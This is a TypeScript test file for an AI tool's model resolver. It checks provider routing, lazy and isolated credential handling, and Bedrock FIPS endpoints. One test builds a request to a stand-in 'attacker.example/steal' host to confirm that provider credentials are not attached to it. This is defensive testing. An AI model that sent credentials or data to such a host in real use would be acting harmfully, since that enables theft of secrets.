import { describe, expect, it } from "@effect/vitest"
import { Model as ModelSchema } from "@bymorning/schema/model"
import { Agent } from "@bymorning/schema/agent"
import { Session } from "@bymorning/schema/session"
import { Provider as ProviderSchema } from "@bymorning/schema/provider"
import { Effect, Layer, Option, Redacted, Ref, Stream } from "effect"
import { Headers, HttpClientRequest, HttpClientResponse } from "effect/unstable/http"
import { Catalog } from "../src/catalog.js"
import { Integration } from "../src/integration.js"
import { Model } from "../src/model.js"
import { ModelResolver } from "../src/model-resolver.js"
import { Provider } from "../src/provider.js"
import * as BedrockConverse from "@opencode-ai/ai/protocols/bedrock-converse"
import { Auth } from "@opencode-ai/ai/route/auth"
import { LLMRequest, Message } from "@opencode-ai/ai/schema/messages"
import { request } from "@opencode-ai/ai/llm"
import { LLMClient } from "@opencode-ai/ai/route/client"
import { RequestExecutor } from "@opencode-ai/ai/route/executor"
import { AIError, InvalidRequestError } from "@opencode-ai/ai/schema/errors"
import { AwsRegion } from "@bymorning/schema/aws-region"
import { Credential } from "@bymorning/schema/credential"
import { registry as modelRegistry } from "../src/model/registry.js"
import { packages } from "../src/catalog/transport.js"

const binding = (selection: Model.Selection) => {
  const implementation = packages[selection.package]
  if (!implementation) throw new Error("Fixture transport is missing")
  return {
    implementation,
    authentication: {
      type: "key" as const,
      integration: selection.info.provider,
      header: selection.info.provider === "anthropic" ? "x-api-key" : selection.info.provider === "google" ? "x-goog-api-key" : "authorization",
      ...(selection.info.provider === "anthropic" || selection.info.provider === "google" ? {} : { prefix: "Bearer " }),
    },
  }
}

const refs = [
  ModelSchema.Ref.make({ provider: ProviderSchema.OpenAI, id: "gpt-5.6" }),
  ModelSchema.Ref.make({ provider: ProviderSchema.Anthropic, id: "claude-sonnet-5" }),
  ModelSchema.Ref.make({ provider: ProviderSchema.Fireworks, id: "glm-5p2" }),
  ModelSchema.Ref.make({ provider: ProviderSchema.DeepSeek, id: "deepseek-v4-pro" }),
]
const google = ModelSchema.Ref.make({ provider: ProviderSchema.Google, id: "gemini-test" })
const googleSource = modelRegistry.find(({ provider }) => provider === ProviderSchema.OpenAI)!
const googleSelection = {
  info: ModelSchema.Info.make({
    ...googleSource,
    id: google.id,
    provider: google.provider,
    apiID: "gemini-2.5-pro",
    variants: [],
  }),
  format: "google",
  package: "@opencode-ai/ai/providers/google",
  settings: { baseURL: "https://generativelanguage.googleapis.com/v1beta" },
  options: {},
} satisfies Model.Selection

describe("ModelResolver", () => {
  it.effect("retains partial Chat output with an unknown finish without relaxing other protocols", () =>
    Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service.pipe(
        Effect.provide(resolverLayer({ credential: Effect.succeed(undefined) })),
      )
      const resolved = yield* resolver.resolve({ model: refs[3]!, baseURL: "https://fixture.invalid", headers: {} })
      expect(resolved.runtimeModel.compatibility?.requireFinishReason).toBeUndefined()
      for (const model of [refs[0]!, refs[1]!]) {
        const other = yield* resolver.resolve({ model, headers: {} })
        expect(other.runtimeModel.compatibility?.requireFinishReason).toBeUndefined()
      }
      const providers = yield* Provider.Service.pipe(
        Effect.provide(
          Provider.layerWithExecutor({
            execute: (physical) =>
              Effect.succeed(
                HttpClientResponse.fromWeb(
                  physical,
                  new Response('data: {"choices":[{"index":0,"delta":{"content":"partial answer"}}]}\n\n', {
                    headers: { "content-type": "text/event-stream" },
                  }),
                ),
              ),
          }),
        ),
      )
      const events = yield* providers
        .stream({
          context: {
            purpose: "assistant",
            sessionID: Session.ID.make("00000000-0000-4000-8000-000000000001"),
            agent: Agent.DefaultID,
            requestedModel: refs[3]!,
            model: refs[3]!,
          },
          selection: resolved.selection,
          runtimeModel: resolved.runtimeModel,
          messages: [Message.user("hello")],
          authentication: (physical, handler) => handler(physical),
          http: (physical, handler) => handler(physical),
        })
        .pipe(Stream.runCollect)
      expect(events).toContainEqual(expect.objectContaining({ type: "text-delta", text: "partial answer" }))
      expect(events.at(-1)).toMatchObject({ type: "finish", reason: { normalized: "unknown" } })
      expect(resolved.runtimeModel.compatibility?.requireFinishReason).toBeUndefined()
    }),
  )

  it.effect("retains populated flat provider options and the Anthropic output cap in native request bodies", () =>
    Effect.gen(function* () {
      const models = yield* Model.Service
      const cases = [
        {
          model: refs[0]!,
          options: { reasoningEffort: "high", store: false },
          expected: { reasoning: { effort: "high" }, store: false },
        },
        {
          model: refs[1]!,
          options: { thinking: { type: "enabled", budgetTokens: 1024 } },
          expected: { thinking: { type: "enabled", budget_tokens: 1024 } },
        },
        {
          model: google,
          options: { thinkingConfig: { thinkingBudget: 1024, includeThoughts: true } },
          expected: { generationConfig: { thinkingConfig: { thinkingBudget: 1024, includeThoughts: true } } },
        },
      ]
      for (const item of cases) {
        const selected = item.model === google ? googleSelection : yield* models.get(item.model)
        const selection = { ...selected, options: item.options }
        const resolved = yield* ModelResolver.Service.use((resolver) =>
          resolver.resolve({ model: item.model, headers: {} }),
        ).pipe(Effect.provide(resolverLayer({ selection, credential: Effect.succeed(undefined) })))
        const captured = yield* Ref.make<HttpClientRequest.HttpClientRequest | undefined>(undefined)
        const stopped = new AIError({
          reason: new InvalidRequestError({ message: "Request captured without network IO" }),
        })
        const failure = yield* LLMClient.stream(request({ model: resolved.runtimeModel, prompt: "hello" })).pipe(
          Stream.runDrain,
          Effect.flip,
          Effect.provide(LLMClient.layer),
          Effect.provideService(RequestExecutor.Service, {
            execute: (physical) => Ref.set(captured, physical).pipe(Effect.andThen(Effect.fail(stopped))),
          }),
        )
        expect(failure).toEqual(stopped)
        const physical = yield* Ref.get(captured)
        if (physical?.body._tag !== "Uint8Array") return yield* Effect.die("Expected captured JSON request")
        const body: unknown = JSON.parse(new TextDecoder().decode(physical.body.body))
        expect(body).toMatchObject(item.expected)
        expect(resolved.selection.info.limit).toEqual(selection.info.limit)
        if (selection.format === "anthropic") expect(body).toMatchObject({ max_tokens: selection.info.limit.output })
        else expect(resolved.runtimeModel.route.defaults.generation?.maxTokens).toBeUndefined()
      }
    }).pipe(Effect.provide(Model.layer)),
  )

  it.effect("constructs provider-native routes without eagerly resolving credentials", () => {
    const resolvedCredentials = Ref.makeUnsafe(0)
    return Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* Effect.forEach(refs, (model) => resolver.resolve({ model, headers: {} }))

      expect(resolved.map((item) => [item.runtimeModel.provider, item.runtimeModel.id])).toEqual([
        ["openai", "gpt-5.6"],
        ["anthropic", "claude-sonnet-5"],
        ["fireworks", "accounts/fireworks/models/glm-5p2"],
        ["deepseek", "deepseek-v4-pro"],
      ])
      expect(yield* Ref.get(resolvedCredentials)).toBe(0)
    }).pipe(
      Effect.provide(
        resolverLayer({
          credential: Ref.update(resolvedCredentials, (count) => count + 1).pipe(
            Effect.as({ type: "key" as const, key: "unused" }),
          ),
        }),
      ),
    )
  })

  it.effect("constructs Google models and applies the native API-key header", () =>
    Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* resolver.resolve({ model: google, headers: {} })
      expect(resolved.runtimeModel).toMatchObject({ provider: "google", id: "gemini-2.5-pro" })

      const header = yield* Ref.make<string | undefined>(undefined)
      yield* resolved.authentication(
        HttpClientRequest.get("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro"),
        (request) =>
          Ref.set(header, Option.getOrUndefined(Headers.get(request.headers, "x-goog-api-key"))).pipe(
            Effect.as(HttpClientResponse.fromWeb(request, new Response(null))),
          ),
      )
      expect(yield* Ref.get(header)).toBe("google-secret")
    }).pipe(
      Effect.provide(
        resolverLayer({
          credential: Effect.succeed({ type: "key", key: "google-secret" }),
          selection: googleSelection,
        }),
      ),
    ),
  )

  it.effect("resolves one selected execution into a Provider-native destination", () =>
    Effect.gen(function* () {
      const selection = yield* (yield* Model.Service).get(refs[0]!)
      const destination = yield* (yield* ModelResolver.Service).native({
        ...binding(selection),
        selection,
        package: selection.package,
        settings: selection.settings,
        routing: { type: "fixed", baseURL: new URL("https://api.openai.com/v1") },
      })
      expect(destination.model).toEqual(selection.info)
      expect(destination.baseURL.toString()).toBe("https://api.openai.com/v1")
      expect(Redacted.value(destination.headers)).toEqual({ authorization: "Bearer native-secret" })
    }).pipe(
      Effect.provide(
        Layer.merge(resolverLayer({ credential: Effect.succeed({ type: "key", key: "native-secret" }) }), Model.layer),
      ),
    ),
  )

  it.effect("fails closed when a fixed execution has no effective endpoint", () =>
    Effect.gen(function* () {
      const selection = yield* (yield* Model.Service).get(refs[0]!)
      const failure = yield* (yield* ModelResolver.Service)
        .native({
          ...binding(selection),
          selection,
          package: selection.package,
          settings: selection.settings,
          routing: { type: "fixed" },
        })
        .pipe(Effect.flip)
      expect(failure._tag).toBe("ModelResolver.ResolutionError")
      expect(failure.reason).toBe("transport-unsupported")
    }).pipe(
      Effect.provide(
        Layer.merge(resolverLayer({ credential: Effect.succeed({ type: "key", key: "native-secret" }) }), Model.layer),
      ),
    ),
  )

  it.effect("resolves rotated credentials lazily and fails redacted after removal", () => {
    const credential = Ref.makeUnsafe<{ type: "key"; key: string } | undefined>({ type: "key", key: "first" })
    return Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* resolver.resolve({ model: refs[0]!, headers: { "x-plugin": "before-auth" } })
      const observed = yield* Ref.make<ReadonlyArray<HttpClientRequest.HttpClientRequest>>([])
      const execute = () =>
        resolved.authentication(HttpClientRequest.get("https://api.openai.com/v1/responses"), (request) =>
          Ref.update(observed, (requests) => [...requests, request]).pipe(
            Effect.as(HttpClientResponse.fromWeb(request, new Response(null))),
          ),
        )

      yield* execute()
      const rotated: { type: "key"; key: string } | undefined = { type: "key", key: "second" }
      yield* Ref.set(credential, rotated)
      yield* execute()
      const requests = yield* Ref.get(observed)
      expect(Option.getOrUndefined(Headers.get(requests[0]!.headers, "authorization"))).toBe("Bearer first")
      expect(Option.getOrUndefined(Headers.get(requests[1]!.headers, "authorization"))).toBe("Bearer second")
      yield* Ref.set(credential, undefined)
      const error = yield* execute().pipe(Effect.flip)
      expect(error).toEqual(new Provider.FailureError({ cause: "Provider credential is unavailable" }))
      expect(JSON.stringify(error)).not.toContain("second")
    }).pipe(Effect.provide(resolverLayer({ credential: Ref.get(credential) })))
  })

  it.effect("authenticates only canonical planned and physical origins", () => {
    const lookups = Ref.makeUnsafe(0)
    return Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const execute = (baseURL: string | undefined, physicalURL: string) =>
        Effect.gen(function* () {
          const resolved = yield* resolver.resolve({
            model: refs[0]!,
            ...(baseURL === undefined ? {} : { baseURL }),
            headers: {},
          })
          const observed = yield* Ref.make<HttpClientRequest.HttpClientRequest | undefined>(undefined)
          yield* resolved.authentication(
            HttpClientRequest.get(physicalURL).pipe(HttpClientRequest.setHeader("authorization", "Plugin secret")),
            (request) =>
              Ref.set(observed, request).pipe(Effect.as(HttpClientResponse.fromWeb(request, new Response(null)))),
          )
          return Option.getOrUndefined(Headers.get((yield* Ref.get(observed))!.headers, "authorization"))
        })

      expect(yield* execute(undefined, "https://api.openai.com/v1/responses")).toBe("Bearer provider-secret")
      expect(yield* Ref.get(lookups)).toBe(1)
      expect(yield* execute(undefined, "https://router.example/v1/responses")).toBe("Plugin secret")
      expect(yield* execute("https://router.example/v1", "https://router.example/v1/responses")).toBe("Plugin secret")
      expect(yield* execute("https://router.example/v1", "https://api.openai.com/v1/responses")).toBe("Plugin secret")
      expect(yield* Ref.get(lookups)).toBe(1)
    }).pipe(
      Effect.provide(
        resolverLayer({
          credential: Ref.update(lookups, (count) => count + 1).pipe(
            Effect.as({ type: "key", key: "provider-secret" }),
          ),
        }),
      ),
    )
  })

  it.effect("runs request middleware before authentication and prevents credential redirection", () =>
    Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* resolver.resolve({ model: refs[0]!, headers: {} })
      const observed = yield* Ref.make<HttpClientRequest.HttpClientRequest | undefined>(undefined)
      const plugin: typeof resolved.authentication = (request, handler) =>
        handler(HttpClientRequest.setHeader(request, "x-plugin", "ran"))
      yield* plugin(HttpClientRequest.get("https://api.openai.com/v1/responses"), (hooked) =>
        resolved.authentication(hooked, (authenticated) =>
          Ref.set(observed, authenticated).pipe(
            Effect.as(HttpClientResponse.fromWeb(authenticated, new Response(null))),
          ),
        ),
      )
      expect(Option.getOrUndefined(Headers.get((yield* Ref.get(observed))!.headers, "x-plugin"))).toBe("ran")
      expect(Option.getOrUndefined(Headers.get((yield* Ref.get(observed))!.headers, "authorization"))).toBe(
        "Bearer secret",
      )

      const redirected = yield* Ref.make<HttpClientRequest.HttpClientRequest | undefined>(undefined)
      yield* plugin(HttpClientRequest.get("https://api.openai.com/v1/responses"), () =>
        resolved.authentication(
          HttpClientRequest.get("https://attacker.example/steal").pipe(
            HttpClientRequest.setHeader("authorization", "Plugin redirect secret"),
          ),
          (request) =>
            Ref.set(redirected, request).pipe(Effect.as(HttpClientResponse.fromWeb(request, new Response(null)))),
        ),
      )
      expect(Option.getOrUndefined(Headers.get((yield* Ref.get(redirected))!.headers, "authorization"))).toBe(
        "Plugin redirect secret",
      )
    }).pipe(Effect.provide(resolverLayer({ credential: Effect.succeed({ type: "key", key: "secret" }) }))),
  )

  it.effect("bounds unsupported and missing credentials without making a physical request", () =>
    Effect.gen(function* () {
      const physical = yield* Ref.make(0)
      const execute = (credential: Effect.Effect<unknown>) =>
        Effect.gen(function* () {
          const resolved = yield* (yield* ModelResolver.Service).resolve({ model: refs[0]!, headers: {} })
          return yield* resolved
            .authentication(HttpClientRequest.get("https://api.openai.com/v1/responses"), (request) =>
              Ref.update(physical, (count) => count + 1).pipe(
                Effect.as(HttpClientResponse.fromWeb(request, new Response(null))),
              ),
            )
            .pipe(Effect.flip)
        }).pipe(Effect.provide(resolverLayer({ credential: credential as never })))

      const unsupported = yield* execute(Effect.succeed({ type: "oauth", access: "credential-that-must-not-escape" }))
      expect(unsupported).toEqual(new Provider.FailureError({ cause: "Provider credential is unavailable" }))
      expect(JSON.stringify(unsupported)).not.toContain("credential-that-must-not-escape")
      expect(yield* execute(Effect.void)).toEqual(
        new Provider.FailureError({ cause: "Provider credential is unavailable" }),
      )
      expect(yield* Ref.get(physical)).toBe(0)
    }),
  )

  it.effect("isolates credentials between Workspace-scoped resolver layers", () =>
    Effect.gen(function* () {
      const read = (layer: Layer.Layer<ModelResolver.Service>) =>
        Effect.gen(function* () {
          const resolved = yield* (yield* ModelResolver.Service).resolve({ model: refs[0]!, headers: {} })
          const authorization = yield* Ref.make<string | undefined>(undefined)
          yield* resolved.authentication(HttpClientRequest.get("https://api.openai.com/v1/responses"), (request) =>
            Ref.set(authorization, Option.getOrUndefined(Headers.get(request.headers, "authorization"))).pipe(
              Effect.as(HttpClientResponse.fromWeb(request, new Response(null))),
            ),
          )
          return yield* Ref.get(authorization)
        }).pipe(Effect.provide(layer))
      expect(yield* read(resolverLayer({ credential: Effect.succeed({ type: "key", key: "workspace-a" }) }))).toBe(
        "Bearer workspace-a",
      )
      expect(yield* read(resolverLayer({ credential: Effect.succeed({ type: "key", key: "workspace-b" }) }))).toBe(
        "Bearer workspace-b",
      )
    }),
  )

  it.effect("constructs unsigned native ConverseStream requests before final authentication", () => {
    const resolutions = Ref.makeUnsafe(0)
    const models = ["amazon.nova-lite-v1:0", "us.anthropic.claude-haiku-4-5-20251001-v1:0"]
    return Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      for (const id of models) {
        const resolved = yield* resolver.resolve({
          model: ModelSchema.Ref.make({ provider: ProviderSchema.AmazonBedrock, id }),
          headers: { "x-plugin-input": "present" },
        })
        expect(resolved.runtimeModel).toMatchObject({ provider: "amazon-bedrock", id })
        expect(resolved.runtimeModel.route.id).toBe("bedrock-converse")
        expect(resolved.runtimeModel.route.protocol).toBe(BedrockConverse.route.protocol)
        expect(resolved.runtimeModel.route.auth).toBe(Auth.none)
        const route: typeof BedrockConverse.route = resolved.runtimeModel.route
        const request = new LLMRequest({
          model: resolved.runtimeModel,
          system: [],
          messages: [{ role: "user", content: [{ type: "text", text: "hello" }] }],
          tools: [],
        })
        const body = yield* route.body.from(request) as Effect.Effect<
          BedrockConverse.BedrockConverseBody,
          unknown,
          never
        >
        const prepared = yield* route.prepareTransport(body, request) as Effect.Effect<
          { readonly request: HttpClientRequest.HttpClientRequest },
          unknown,
          never
        >
        expect(prepared.request.url).toBe(
          `https://bedrock-runtime.us-east-1.amazonaws.com/model/${encodeURIComponent(id)}/converse-stream`,
        )
        expect(prepared.request.body._tag).toBe("Uint8Array")
        if (prepared.request.body._tag !== "Uint8Array") return
        expect(prepared.request.body.body).toBeInstanceOf(Uint8Array)
        expect(JSON.parse(new TextDecoder().decode(prepared.request.body.body))).toMatchObject({
          modelId: id,
          messages: [{ role: "user", content: [{ text: "hello" }] }],
        })

        const observed = yield* Ref.make<HttpClientRequest.HttpClientRequest | undefined>(undefined)
        yield* resolved.authentication(
          HttpClientRequest.setHeader(prepared.request, "x-plugin", "before-auth"),
          (authenticated) =>
            Ref.set(observed, authenticated).pipe(
              Effect.as(HttpClientResponse.fromWeb(authenticated, new Response(null))),
            ),
        )
        expect(Option.getOrUndefined(Headers.get((yield* Ref.get(observed))!.headers, "x-plugin"))).toBe("before-auth")
        expect(Option.getOrUndefined(Headers.get((yield* Ref.get(observed))!.headers, "authorization"))).toBe(
          "Bearer unused",
        )
      }
      expect(yield* Ref.get(resolutions)).toBe(2)
    }).pipe(Effect.provide(bedrockResolverLayer(resolutions)))
  })
})

describe("Bedrock FIPS endpoint selection", () => {
  const converseModel = ModelSchema.Ref.make({ provider: ProviderSchema.AmazonBedrock, id: "amazon.nova-lite-v1:0" })
  const mantleModel = ModelSchema.Ref.make({ provider: ProviderSchema.AmazonBedrock, id: "openai.gpt-5.4" })

  /** Runs `effect` with AWS_USE_FIPS_ENDPOINT set (or unset), restoring the previous value. */
  const withFips = <A, E, R>(value: string | undefined, effect: Effect.Effect<A, E, R>) =>
    Effect.acquireUseRelease(
      Effect.sync(() => {
        const previous = process.env.AWS_USE_FIPS_ENDPOINT
        if (value === undefined) delete process.env.AWS_USE_FIPS_ENDPOINT
        else process.env.AWS_USE_FIPS_ENDPOINT = value
        return previous
      }),
      () => effect,
      (previous) =>
        Effect.sync(() => {
          if (previous === undefined) delete process.env.AWS_USE_FIPS_ENDPOINT
          else process.env.AWS_USE_FIPS_ENDPOINT = previous
        }),
    )

  /** Builds the transport request the resolved Model would send and returns its URL. */
  const requestURL = (resolved: ModelResolver.Resolved) =>
    Effect.gen(function* () {
      const request = new LLMRequest({
        model: resolved.runtimeModel,
        system: [],
        messages: [{ role: "user", content: [{ type: "text", text: "hello" }] }],
        tools: [],
      })
      const body = yield* resolved.runtimeModel.route.body.from(request) as Effect.Effect<unknown, unknown, never>
      const prepared = yield* resolved.runtimeModel.route.prepareTransport(body, request) as Effect.Effect<
        { readonly request: HttpClientRequest.HttpClientRequest },
        unknown,
        never
      >
      return prepared.request.url
    })

  it.effect("[SEC-FIPSEP-01] Converse uses the standard endpoint when AWS_USE_FIPS_ENDPOINT is unset", () =>
    withFips(undefined, Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* resolver.resolve({ model: converseModel, headers: {} })
      expect(yield* requestURL(resolved)).toBe(
        "https://bedrock-runtime.us-east-1.amazonaws.com/model/amazon.nova-lite-v1%3A0/converse-stream",
      )
    })).pipe(Effect.provide(bedrockResolverLayer(Ref.makeUnsafe(0)))),
  )

  it.effect("[SEC-FIPSEP-02] Converse uses and authenticates the FIPS-designated endpoint when AWS_USE_FIPS_ENDPOINT=true", () =>
    withFips("true", Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* resolver.resolve({ model: converseModel, headers: {} })
      const request = new LLMRequest({
        model: resolved.runtimeModel,
        system: [],
        messages: [{ role: "user", content: [{ type: "text", text: "hello" }] }],
        tools: [],
      })
      const body = yield* resolved.runtimeModel.route.body.from(request) as Effect.Effect<unknown, unknown, never>
      const prepared = yield* resolved.runtimeModel.route.prepareTransport(body, request) as Effect.Effect<
        { readonly request: HttpClientRequest.HttpClientRequest },
        unknown,
        never
      >
      expect(prepared.request.url).toBe(
        "https://bedrock-runtime-fips.us-east-1.amazonaws.com/model/amazon.nova-lite-v1%3A0/converse-stream",
      )
      // The canonical origin the authenticator pins to is the FIPS origin, so
      // the request is authenticated rather than passed through unsigned.
      const observed = yield* Ref.make<HttpClientRequest.HttpClientRequest | undefined>(undefined)
      yield* resolved.authentication(prepared.request, (authenticated) =>
        Ref.set(observed, authenticated).pipe(
          Effect.as(HttpClientResponse.fromWeb(authenticated, new Response(null))),
        ),
      )
      expect(Option.getOrUndefined(Headers.get((yield* Ref.get(observed))!.headers, "authorization"))).toBe(
        "Bearer unused",
      )
    })).pipe(Effect.provide(bedrockResolverLayer(Ref.makeUnsafe(0)))),
  )

  it.effect("[SEC-FIPSEP-03] Mantle keeps its standard endpoint when AWS_USE_FIPS_ENDPOINT=true (no FIPS Mantle endpoint exists)", () =>
    withFips("true", Effect.gen(function* () {
      const resolver = yield* ModelResolver.Service
      const resolved = yield* resolver.resolve({ model: mantleModel, headers: {} })
      expect(resolved.runtimeModel.route.protocol).not.toBe(BedrockConverse.route.protocol)
      expect(yield* requestURL(resolved)).toBe("https://bedrock-mantle.us-east-1.api.aws/v1/responses")
    })).pipe(Effect.provide(bedrockResolverLayer(Ref.makeUnsafe(0)))),
  )

  it.effect("[SEC-FIPSEP-04] only the literal \"true\" (any case) selects the FIPS endpoint", () =>
    Effect.gen(function* () {
      for (const [value, host] of [
        ["1", "bedrock-runtime.us-east-1.amazonaws.com"],
        ["yes", "bedrock-runtime.us-east-1.amazonaws.com"],
        ["", "bedrock-runtime.us-east-1.amazonaws.com"],
        ["TRUE", "bedrock-runtime-fips.us-east-1.amazonaws.com"],
      ] as const) {
        yield* withFips(value, Effect.gen(function* () {
          const resolver = yield* ModelResolver.Service
          const resolved = yield* resolver.resolve({ model: converseModel, headers: {} })
          expect(new URL(yield* requestURL(resolved)).host).toBe(host)
        }))
      }
    }).pipe(Effect.provide(bedrockResolverLayer(Ref.makeUnsafe(0)))),
  )
})

function resolverLayer(input: {
  readonly credential: Effect.Effect<{ readonly type: "key"; readonly key: string } | undefined>
  readonly selection?: Model.Selection
}) {
  const integration = Integration.Service.of({
    get: (id: Integration.ID) =>
      Effect.succeed({ id, name: id, methods: [], connections: [{ type: "env", name: "test" }] }),
    connection: {
      active: () => Effect.succeed({ type: "env", name: "test" }),
      resolve: () => input.credential,
    },
  } as unknown as Integration.Interface)
  const catalog = Layer.effect(
    Catalog.Service,
    Model.Service.use((models) =>
      Effect.succeed(
        Catalog.Service.of({
          provider: {
            get: () => Effect.die("unused"),
            all: () => Effect.die("unused"),
            available: () => Effect.die("unused"),
            directory: () => Effect.die("unused"),
            update: () => Effect.die("unused"),
          },
          model: {
            requireExecution: (model: ModelSchema.Ref) =>
              (input.selection?.info.provider === model.provider && input.selection.info.id === model.id
                ? Effect.succeed(input.selection)
                : models.get(model)
              ).pipe(
                Effect.map((selection) => ({ ...binding(selection), selection, package: selection.package, settings: selection.settings, routing: { type: "fixed" as const, baseURL: new URL(String(selection.settings.baseURL)) } })),
                Effect.mapError(() => new Catalog.ModelUnavailableError({ model })),
              ),
            requireAvailable: (model: ModelSchema.Ref) =>
              models.get(model).pipe(
                Effect.map((selection) => selection.info),
                Effect.mapError(() => new Catalog.ModelUnavailableError({ model })),
              ),
          },
        } as unknown as Catalog.Interface),
      ),
    ),
  ).pipe(Layer.provide(Model.layer))
  return ModelResolver.layer.pipe(
    Layer.provide(
      Layer.mergeAll(catalog, Layer.succeed(Integration.Service, integration), Model.layer, Provider.layer),
    ),
  )
}

function bedrockResolverLayer(resolutions: Ref.Ref<number>): Layer.Layer<ModelResolver.Service> {
  const region = AwsRegion.make("us-east-1")
  const credentialID = Credential.ID.make("cred_bedrock")
  const integration = Integration.Service.of({
    get: (id: Integration.ID) => Effect.succeed({ id, name: id, methods: [], connections: [] }),
    connection: {
      active: () =>
        Effect.succeed({
          type: "regional-credential",
          id: credentialID,
          label: "Bedrock",
          authKind: "bearer",
          region,
        }),
      resolve: () =>
        Ref.update(resolutions, (count) => count + 1).pipe(
          Effect.as({
            type: "key" as const,
            key: "unused",
            configuration: { type: "aws-region" as const, region },
          }),
        ),
    },
  } as unknown as Integration.Interface)
  const catalog = Layer.effect(
    Catalog.Service,
    Model.Service.use((models) =>
      Effect.succeed(
        Catalog.Service.of({
          provider: {
            get: () => Effect.die("unused"),
            all: () => Effect.die("unused"),
            available: () => Effect.die("unused"),
            directory: () => Effect.die("unused"),
            update: () => Effect.die("unused"),
          },
          model: {
            requireExecution: (model: ModelSchema.Ref) =>
              models.get(model).pipe(
                Effect.map((selection) => ({
                  ...binding(selection),
                  selection,
                  package: selection.package,
                  settings: selection.settings,
                  routing: {
                    type: "aws-bedrock" as const,
                    integration: Integration.ID.make(ProviderSchema.AmazonBedrock),
                    region,
                    connection: { type: "credential" as const, id: credentialID, authKind: "bearer" as const },
                  },
                })),
                Effect.mapError(() => new Catalog.ModelUnavailableError({ model })),
              ),
          },
        } as unknown as Catalog.Interface),
      ),
    ),
  ).pipe(Layer.provide(Model.layer))
  return ModelResolver.layer.pipe(
    Layer.provide(Layer.mergeAll(catalog, Layer.succeed(Integration.Service, integration), Provider.layer)),
  )
}
